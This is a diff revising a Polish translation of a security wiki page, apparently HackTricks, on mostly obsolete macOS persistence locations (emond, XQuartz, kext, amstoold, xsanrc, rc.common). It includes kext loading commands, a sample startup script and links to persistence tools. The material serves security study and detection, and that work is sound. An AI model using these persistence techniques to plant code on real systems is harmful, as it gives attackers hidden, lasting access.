-Opis: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)
+Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)
 
-Wprowadzony przez Apple, **emond** to mechanizm logowania, który wydaje się być niedorozwinięty lub być może porzucony, jednak pozostaje dostępny. Chociaż nie jest szczególnie korzystny dla administratora Maca, ta niejasna usługa może służyć jako subtelna metoda utrzymywania się dla aktorów zagrożeń, prawdopodobnie niezauważona przez większość administratorów macOS.
+Wprowadzony przez Apple, **emond** jest mechanizmem logowania, który wydaje się niedopracowany lub być może porzucony, a mimo to pozostaje dostępny. Choć nie jest szczególnie przydatny dla administratora Mac, ta mało znana usługa może posłużyć jako subtelna metoda persistence dla threat actors, prawdopodobnie niezauważona przez większość macOS admins.
 
-Dla tych, którzy są świadomi jej istnienia, identyfikacja jakiegokolwiek złośliwego użycia **emond** jest prosta. LaunchDaemon systemu dla tej usługi poszukuje skryptów do wykonania w jednym katalogu. Aby to sprawdzić, można użyć następującego polecenia:
+Dla tych, którzy zdają sobie z jej istnienia sprawę, wykrycie złośliwego użycia **emond** jest proste. Systemowy LaunchDaemon tej usługi szuka skryptów do wykonania w jednym katalogu. Aby to sprawdzić, można użyć następującego polecenia:
 ```bash
 ls -l /private/var/db/emondClients
 ```
 ### ~~XQuartz~~
 
-Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)
+Opis: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)
 
-#### Location
+#### Lokalizacja
 
 - **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
 - Wymagany root
-- **Wyzwalacz**: Z XQuartz
+- **Wyzwalacz**: z XQuartz
 
-#### Description & Exploit
+#### Opis & Exploit
 
-XQuartz **nie jest już zainstalowany w macOS**, więc jeśli chcesz więcej informacji, sprawdź opis.
+XQuartz jest **nie jest już instalowany w macOS**, więc jeśli chcesz więcej informacji, sprawdź writeup.
 
 ### ~~kext~~
 
 > [!CAUTION]
-> Instalacja kext, nawet jako root, jest tak skomplikowana, że nie będę tego rozważać jako sposobu na ucieczkę z piaskownic ani nawet na utrzymanie (chyba że masz exploit)
+> Instalacja kext jest tak skomplikowana, nawet jako root, że nie będę tego rozważać jako sposób na escape from sandboxes ani nawet na persistence (chyba że masz exploit)
 
-#### Location
+#### Lokalizacja
 
-Aby zainstalować KEXT jako element startowy, musi być **zainstalowany w jednej z następujących lokalizacji**:
+Aby zainstalować KEXT jako element uruchamiania, musi być **zainstalowany w jednej z następujących lokalizacji**:
 
 - `/System/Library/Extensions`
 - Pliki KEXT wbudowane w system operacyjny OS X.
 - `/Library/Extensions`
 - Pliki KEXT zainstalowane przez oprogramowanie firm trzecich
 
-Możesz wylistować aktualnie załadowane pliki kext za pomocą:
+Możesz wyświetlić aktualnie załadowane pliki kext za pomocą:
 ```bash
 kextstat #List loaded kext
 kextload /path/to/kext.kext #Load a new one based on path
@@ -1536,7 +1550,7 @@ kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
 kextunload /path/to/kext.kext
 kextunload -b com.apple.driver.ExampleBundle
 ```
-Dla uzyskania dodatkowych informacji o [**rozszerzeniach jądra sprawdź tę sekcję**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).
+Więcej informacji na temat [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).
 
 ### ~~amstoold~~
 
@@ -1545,11 +1559,11 @@ Opis: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.gith
 #### Lokalizacja
 
 - **`/usr/local/bin/amstoold`**
-- Wymagane uprawnienia roota
+- Wymagane uprawnienia: root
 
-#### Opis i wykorzystanie
+#### Opis i eksploatacja
 
-Najwyraźniej `plist` z `/System/Library/LaunchAgents/com.apple.amstoold.plist` używał tego binarnego pliku, jednocześnie eksponując usługę XPC... problem w tym, że ten plik binarny nie istniał, więc mogłeś umieścić coś tam, a gdy usługa XPC zostanie wywołana, twój plik binarny zostanie wywołany.
+Najwyraźniej `plist` z `/System/Library/LaunchAgents/com.apple.amstoold.plist` używał tego pliku binarnego przy wystawianiu XPC service... problem w tym, że plik binarny nie istniał, więc można było umieścić tam własny program, a gdy XPC service zostanie wywołany, wywołany zostanie twój plik binarny.
 
 Nie mogę już tego znaleźć w moim macOS.
 
@@ -1560,18 +1574,18 @@ Opis: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.gith
 #### Lokalizacja
 
 - **`/Library/Preferences/Xsan/.xsanrc`**
-- Wymagane uprawnienia roota
-- **Wyzwalacz**: Gdy usługa jest uruchamiana (rzadko)
+- Wymagane uprawnienia: root
+- **Trigger**: Gdy usługa jest uruchamiana (rzadko)
 
-#### Opis i wykorzystanie
+#### Opis i eksploatacja
 
-Najwyraźniej nie jest zbyt powszechne uruchamianie tego skryptu i nie mogłem go nawet znaleźć w moim macOS, więc jeśli chcesz więcej informacji, sprawdź opis.
+Najwyraźniej uruchamianie tego skryptu nie jest zbyt powszechne i nawet nie mogłem go znaleźć w moim macOS, więc jeśli chcesz więcej informacji, sprawdź opis.
 
 ### ~~/etc/rc.common~~
 
-> [!CAUTION] > **To nie działa w nowoczesnych wersjach MacOS**
+> [!CAUTION] > **This isn't working in modern MacOS versions**
 
-Możliwe jest również umieszczenie tutaj **komend, które będą wykonywane przy starcie.** Przykład standardowego skryptu rc.common:
+Możliwe jest również umieszczenie tutaj **poleceń, które będą wykonywane przy starcie.** Przykładowy zwykły skrypt rc.common:
 ```bash
 #
 # Common setup for startup scripts.
@@ -1664,9 +1678,13 @@ restart) RestartService ;;
 esac
 }
 ```
-## Techniki i narzędzia utrzymywania
+## Persistence — techniki i narzędzia
 
 - [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
 - [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)
+
+## Źródła
+
+- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
 
 {{#include ../banners/hacktricks-training.md}}
